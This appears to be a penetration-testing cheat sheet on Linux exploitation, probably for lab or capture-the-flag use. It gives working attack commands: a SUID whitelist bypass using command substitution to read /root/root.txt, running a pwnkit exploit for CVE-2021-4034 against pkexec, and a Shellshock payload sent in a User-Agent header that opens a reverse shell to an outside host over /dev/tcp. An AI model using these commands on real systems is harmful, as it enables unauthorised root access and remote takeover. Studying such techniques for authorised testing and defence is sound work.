---
icon: face-angry-horns
---

# Binary Exploitation - Linux

{% hint style="danger" %}
### <mark style="color:purple;">Bypass</mark> <mark style="color:orange;">`SUID`</mark> <mark style="color:purple;">whitelist</mark>

* <mark style="color:purple;">Sometimes</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">commands may have a whitelist for commands .</mark>
* <mark style="color:purple;">This can be bypassed by using</mark> <mark style="color:orange;">**`subcommands`**</mark><mark style="color:purple;">**:**</mark>

```sh
supershell ‘/bin/ls $(cat /root/root.txt)’
```

* <mark style="color:purple;">In this example</mark> <mark style="color:orange;">**`supershell`**</mark> <mark style="color:purple;">is the</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">binary and</mark> <mark style="color:orange;">**`/bin/ls`**</mark> <mark style="color:purple;">the whitelisted command, there are also another way to bypass this by using</mark> <mark style="color:orange;">**`'`**</mark> <mark style="color:purple;">to open a quote:</mark>

```sh
supershell ‘/bin/ls
```

* <mark style="color:purple;">Then in the next line use your desired command:</mark>

```sh
cat /root/root.txt’
```
{% endhint %}

***

{% hint style="danger" %}
### <mark style="color:purple;">Exploit</mark> <mark style="color:orange;">`pkexec`</mark>

* <mark style="color:purple;">Check if</mark> <mark style="color:orange;">**`pkexec`**</mark> <mark style="color:purple;">has</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">permissions:</mark>

```sh
ls -l /usr/bin/pkexec
```

* <mark style="color:purple;">Use</mark> [<mark style="color:orange;">**`pwnkit`**</mark>](https://github.com/joeammond/CVE-2021-4034/)<mark style="color:purple;">:</mark>&#x20;

```sh
python CVE-2021-4034.py
```
{% endhint %}

***

{% hint style="danger" %}
### <mark style="color:orange;">`ShellSock`</mark>

* <mark style="color:purple;">Attack vectors include remote command execution via</mark> <mark style="color:orange;">**`CGI`**</mark> <mark style="color:purple;">scripts or web servers, as well as exploitation in environments like</mark> <mark style="color:orange;">**`SSH`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`HTTP`**</mark><mark style="color:purple;">, and any process that involves</mark> <mark style="color:orange;">**`Bash`**</mark> <mark style="color:purple;">interpreting environment variables.</mark>
* <mark style="color:purple;">Affects</mark> <mark style="color:orange;">**`Bash`**</mark>**&#x20;**<mark style="color:purple;">**versions**</mark>**&#x20;**<mark style="color:orange;">**`1.x`**</mark>**&#x20;**<mark style="color:purple;">**to**</mark>**&#x20;**<mark style="color:orange;">**`4.3`**</mark><mark style="color:purple;">**:**</mark>

```sh
() { :;}; echo; /usr/bin/id
```

* <mark style="color:purple;">Inject malicious code through the</mark> <mark style="color:orange;">**`User-Agent`**</mark> <mark style="color:purple;">header, targeting a vulnerable</mark> <mark style="color:orange;">**`CGI`**</mark> <mark style="color:purple;">script in the</mark> <mark style="color:orange;">**`/cgi-bin/`**</mark> <mark style="color:purple;">directory to initiate a reverse shell:</mark>

{% code overflow="wrap" %}
```sh
wget -U '() { :;}; echo; /bin/bash >& /dev/tcp/172.24.0.253/4443 0>&1' -O- http://172.24.0.2/cgi-bin/stats
```
{% endcode %}
{% endhint %}

